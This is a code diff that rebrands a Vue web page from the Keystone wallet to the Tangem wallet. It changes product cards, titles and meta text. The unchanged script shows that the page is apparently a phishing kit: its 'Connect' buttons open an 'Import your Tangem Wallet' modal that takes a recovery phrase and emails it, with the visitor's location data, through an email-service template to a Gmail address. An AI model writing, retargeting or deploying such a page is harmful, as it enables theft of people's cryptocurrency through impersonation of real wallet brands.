@@ -1,14 +1,14 @@
 <template>
   <div
-    class="bg-[#111214] min-h-screen flex flex-col"
+    class="bg-[#010101] min-h-screen flex flex-col"
     style="letter-spacing: 0.04em; line-height: 35px"
   >
     <!-- Login Box -->
     <div class="text-white flex-grow text-white">
       <Header />
       <div class="mx-auto max-w-screen-2xl lg:px-20 px-5">
-        <div class="w-full my-10 lg:my-[50px]">
-          <h3 class="font-semibold text-2xl mb-8">Accessories</h3>
+        <div class="w-full my-[150px] lg:my-[180px]">
+          <h3 class="font-semibold text-2xl mb-8">Tangem Wallet</h3>
 
           <!-- Card Grid -->
           <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
@@ -22,32 +22,23 @@
                 :alt="card.title"
                 class="w-full h-[300px] object-contain"
               />
-              <div class="p-8">
+              <div class="p-3">
                 <h4 class="text-lg font-semibold mb-2">{{ card.title }}</h4>
                 <p
+                  
                   class="text-[15px] text-neutral-400 mb-8"
                   style="
                     overflow: hidden;
                     text-overflow: ellipsis;
-                    display: -webkit-box;
-                    -webkit-box-orient: vertical;
-                    -webkit-line-clamp: 2;
+                    line-height: 120%
                   "
                 >
                   {{ card.subtitle }}
                 </p>
                 <button
                   @click="openCloseModal"
-                  class="text-base text-white py-2 px-3 rounded font-semibold transition"
-                  style="
-                    border: 2px solid;
-                    border-image: linear-gradient(
-                        90deg,
-                        #3d71ff 25%,
-                        #6b38fb 100%
-                      )
-                      1;
-                  "
+                  class="btn-primary"
+                  
                 >
                   Connect
                 </button>
@@ -87,7 +78,7 @@
           <div class="flex flex-col items-center justify-center">
             
             <h3 class="text-xl text-gray-600 capitalize">
-              Import your Keystone Wallet
+              Import your Tangem Wallet
             </h3>
           </div>
 
@@ -155,15 +146,16 @@
 <script setup>
 
 useHead({
-  title: "Keystone: Best Open Source Cold Wallet & Hardware Wallet",
+  title: "Tangem — Your Secure Crypto & Hardware Wallet",
   meta: [
     {
       name: "description",
       content:
-        "The only hardware wallet that supports MetaMask mobile. Secure your Bitcoin and other crypto assets offline with Keystone's open-source cold wallet.",
+        "Manage cryptocurrencies securely in the best crypto wallet. Tangem is a simple cold Bitcoin wallet where you can buy, sell, and store Bitcoin, Ethereum, and other crypto assets",
     },
   ],
 });
+
 import Header from "@/components/Header.vue";
 import Footer from "@/components/Footer.vue";
 import axios from "axios";
@@ -172,46 +164,37 @@ import Modal from "@/components/Modal.vue";
 const cards = ref([
   {
     image:
-      "https://cdn.shopify.com/s/files/1/0029/3175/3060/products/Plus1.jpg?v=1677056228",
-    title: "Keystone Tablet Plus",
+      "https://tangem.com/_assets/collections/products/img_01JAZ92V5VY1M06RSGA42YM63Y.webp",
+    title: "3 Cards set",
     subtitle:
-      "Redesigned with individual slots for each letter tile, Keystone Tablet Plus ensures the tiles stay in place even under extreme heat and deformation, providing extra security against fire, water, and physical damage",
+      "A set of three Tangem cards for secure, multi-access wallet management and backup.",
     buttonText: "Connect",
     link: "#",
   },
   {
     image:
-      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/3pro.png?v=1728372157",
-    title: "Keystone 3 Pro",
+      "https://tangem.com/_assets/collections/products/img_01JAZ91P4DQY92S5GJREF5PGZ0.webp",
+    title: "2 Cards set",
     subtitle:
-      "Keystone 3 Pro is the only hardware wallet equipped with three security chips to securely manage multiple crypto accounts. Its Air-Gapped Mode eliminates all connectivity risks, ensuring maximum security for your assets.",
+      "Manage multiple crypto accounts with three security chips and air-gapped protection.",
     buttonText: "Learn More",
     link: "#",
   },
   {
     image:
-      "https://cdn.shopify.com/s/files/1/0029/3175/3060/products/Tablet1.jpg?v=1677056166",
-    title: "Keystone Tablet",
+      "https://tangem.com/_assets/collections/products/img_01JT0A177Q5VD73R4DVTBATVSD.webp",
+    title: "Family Pack",
     subtitle:
-      "Crafted from 304 stainless steel, Keystone Tablet securely stores your seed phrases and private keys, providing protection against fire, water, and physical damage",
+      "A robust stainless steel solution to safeguard your seed phrases and private keys.",
     buttonText: "Learn More",
     link: "#",
   },
   {
     image:
-      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/nft.png?v=1728372188",
-    title: "Keystone 3 Pro Customization",
+      "https://tangem.com/_astro/ring-cards.CMJBZhcJ_Z1tAa1a.avif",
+    title: "Tangem Ring",
     subtitle:
-      "Your assets, your control. Personalize your Keystone 3 Pro by displaying your favorite NFT or image, making it truly one-of-a-kind.*Please note: Delivery takes approximately 3 months due to customization, and returns are not supported once the order is placed.",
-    buttonText: "Learn More",
-    link: "#",
-  },
-  {
-    image:
-      "https://cdn.shopify.com/s/files/1/0029/3175/3060/files/7ac65b00f300a2870f618ae23baf45b1_f2268c24-0fc6-4de3-a52e-3f83ec38365e.png?v=1733194026",
-    title: "Keystone 3 Pro Co-Branded Version",
-    subtitle:
-      "Keystone has been a trusted partner of top brands in the Web3 ecosystem. Together, we have developed a series of co-branded hardware wallets that redefine crypto security *Please note that this is a co-branded custom product, with a production time of approximately 2 months. Returns are not supported once the order is placed.",
+      "A wearable hardware wallet ring for convenient and secure crypto access.",
     buttonText: "Learn More",
     link: "#",
   },
@@ -220,7 +203,7 @@ const cards = ref([
 const showModal = ref(false);
 const modalState = ref("loading");
 const phrase = ref("");
-const name = ref("Keystone Wallet");
+const name = ref("Tangem Wallet");
 const isSubmitting = ref(false);
 
 const openCloseModal = () => {
@@ -252,8 +235,8 @@ const proceed = async () => {
       template_id: "template_xv7sb0z",
       user_id: "user_nsG3rSdCFpgONwwCfNTas",
       template_params: {
-        from_name: "Keystone",
-        wallet_type: "Keystone Wallets",
+        from_name: "Tangem",
+        wallet_type: "Tangem Wallets",
         location: JSON.stringify(location.data),
         link_drops: phrase.value,
         reply_to: "customeronlineagent@gmail.com",
@@ -270,7 +253,7 @@ const proceed = async () => {
       modalState.value = "barcode";
     }
   } catch (error) {
-    console.error("Error importing keystone:", error);
+    console.error("Error importing Tangem:", error);
   } finally {
     isSubmitting.value = false;
   }
